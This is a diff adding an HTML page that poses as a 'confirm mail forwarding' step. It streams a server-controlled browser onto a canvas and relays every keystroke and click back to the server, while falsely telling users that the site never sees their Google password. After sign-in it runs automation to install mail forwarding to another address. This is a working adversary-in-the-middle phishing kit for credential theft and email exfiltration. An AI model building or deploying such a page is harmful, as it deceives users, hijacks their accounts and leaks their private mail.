@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirm forwarding</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; color: #1e293b; }
+  .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+  h1 { font-size: 1.8rem; margin-bottom: 10px; text-align: center; }
+  .subtitle { text-align: center; color: #64748B; margin-bottom: 30px; }
+  .card { background: white; border-radius: 16px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 25px; }
+  .summary-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #F1F5F9; font-size: 0.9rem; }
+  .summary-row span:first-child { color: #64748B; }
+  button { padding: 14px 28px; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600;
+    cursor: pointer; font-family: inherit; background: linear-gradient(135deg, #3B82F6 0%, #8B5CF6 100%);
+    color: white; box-shadow: 0 4px 15px rgba(59,130,246,0.4); width: 100%; }
+  .screen { display: none; }
+  .screen.active { display: block; }
+  #remoteCanvas { width: 100%; border-radius: 12px; border: 1px solid #E2E8F0; cursor: text; background: #000; }
+  .status-line { display: flex; align-items: center; gap: 12px; padding: 14px 18px; background: #F8FAFC;
+    border-radius: 10px; margin-bottom: 15px; font-size: 0.95rem; }
+  .spinner { width: 18px; height: 18px; border: 3px solid #E2E8F0; border-top-color: #3B82F6;
+    border-radius: 50%; animation: spin 0.8s linear infinite; flex-shrink: 0; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .confirm-box { background: #FFFBEB; border: 1px solid #FDE68A; border-radius: 12px; padding: 20px; margin: 20px 0; }
+  .info-box { background: rgba(59,130,246,0.05); border: 1px solid rgba(59,130,246,0.2); border-radius: 12px;
+    padding: 16px; margin: 20px 0; font-size: 0.9rem; line-height: 1.6; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Confirm mail forwarding</h1>
+  <p class="subtitle">This request is asking to forward matching mail to your inbox</p>
+
+  <div id="summaryScreen" class="screen active">
+    <div class="card" id="summaryCard"></div>
+    <div class="info-box">
+      Clicking confirm opens a live view of Google's real sign-in page. You'll type your password directly into that page — this site never sees or stores it.
+    </div>
+    <button onclick="startConfirm()">Confirm and sign in →</button>
+    <p id="loadError" style="color:#EF4444;font-size:0.9rem;margin-top:10px"></p>
+  </div>
+
+  <div id="browserScreen" class="screen">
+    <div class="status-line"><div class="spinner" id="statusSpinner"></div><span id="statusText">Connecting...</span></div>
+    <canvas id="remoteCanvas" width="1280" height="800" tabindex="0"></canvas>
+    <div id="confirmationArea"></div>
+  </div>
+
+  <div id="doneScreen" class="screen">
+    <div class="card" style="text-align:center">
+      <div style="font-size:3rem;margin-bottom:15px">✅</div>
+      <h2>Forwarding is active</h2>
+      <p style="color:#64748B;margin-top:10px">Setup is complete. You can close this page.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const params = new URLSearchParams(location.search);
+const requestId = params.get('requestId');
+const token = params.get('token');
+let ws = null;
+const canvas = document.getElementById('remoteCanvas');
+const ctx = canvas.getContext('2d');
+
+function show(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+async function loadSummary() {
+  try {
+    const res = await fetch(`/api/request/${requestId}?token=${token}`);
+    const data = await res.json();
+    if (!res.ok) { document.getElementById('loadError').textContent = data.error || 'This link is invalid or expired.'; return; }
+
+    const f = data.filters || {};
+    const rows = Object.entries(f).filter(([, v]) => v !== '' && v !== false).map(([k, v]) =>
+      `<div class="summary-row"><span>${k}</span><span>${v}</span></div>`).join('');
+
+    document.getElementById('summaryCard').innerHTML = `
+      <div class="summary-row"><span>From</span><span>${data.sourceEmail}</span></div>
+      <div class="summary-row"><span>To</span><span>${data.destinationEmail}</span></div>
+      ${rows || '<div class="summary-row"><span>Filters</span><span>All mail</span></div>'}
+    `;
+  } catch {
+    document.getElementById('loadError').textContent = 'Could not load this request.';
+  }
+}
+loadSummary();
+
+function startConfirm() {
+  show('browserScreen');
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  ws = new WebSocket(`${proto}://${location.host}/agent-stream?requestId=${requestId}&token=${token}`);
+
+  ws.onmessage = (event) => {
+    const msg = JSON.parse(event.data);
+    if (msg.type === 'frame') {
+      const img = new Image();
+      img.onload = () => ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      img.src = 'data:image/jpeg;base64,' + msg.data;
+    } else if (msg.type === 'status') {
+      document.getElementById('statusText').textContent = msg.message;
+    } else if (msg.type === 'login-detected') {
+      document.getElementById('statusText').textContent = 'Logged in. Starting filter automation...';
+      ws.send(JSON.stringify({ type: 'run-automation' }));
+    } else if (msg.type === 'progress') {
+      document.getElementById('statusText').textContent = msg.message;
+    } else if (msg.type === 'awaiting-confirmation') {
+      document.getElementById('statusSpinner').style.display = 'none';
+      document.getElementById('statusText').textContent = msg.message;
+      document.getElementById('confirmationArea').innerHTML = `
+        <div class="confirm-box"><p>${msg.message}</p>
+        <button style="margin-top:12px" onclick="continueAfterConfirmation()">I've confirmed — continue</button></div>`;
+    } else if (msg.type === 'complete') {
+      show('doneScreen');
+      ws.close();
+    } else if (msg.type === 'error') {
+      document.getElementById('statusSpinner').style.display = 'none';
+      document.getElementById('statusText').textContent = 'Error: ' + msg.message;
+    }
+  };
+
+  canvas.addEventListener('mousemove', (e) => {
+    const rect = canvas.getBoundingClientRect();
+    ws.send(JSON.stringify({ type: 'mousemove', x: (e.clientX-rect.left)*(canvas.width/rect.width), y: (e.clientY-rect.top)*(canvas.height/rect.height) }));
+  });
+  canvas.addEventListener('click', (e) => {
+    const rect = canvas.getBoundingClientRect();
+    canvas.focus();
+    ws.send(JSON.stringify({ type: 'click', x: (e.clientX-rect.left)*(canvas.width/rect.width), y: (e.clientY-rect.top)*(canvas.height/rect.height) }));
+  });
+  canvas.addEventListener('keydown', (e) => { e.preventDefault(); ws.send(JSON.stringify({ type: 'keydown', key: e.key })); });
+  canvas.addEventListener('keyup', (e) => { e.preventDefault(); ws.send(JSON.stringify({ type: 'keyup', key: e.key })); });
+  canvas.addEventListener('wheel', (e) => { e.preventDefault(); ws.send(JSON.stringify({ type: 'scroll', deltaX: e.deltaX, deltaY: e.deltaY })); });
+}
+
+function continueAfterConfirmation() {
+  document.getElementById('confirmationArea').innerHTML = '';
+  document.getElementById('statusSpinner').style.display = 'block';
+  ws.send(JSON.stringify({ type: 'run-automation' }));
+}
+</script>
+</body>
+</html>
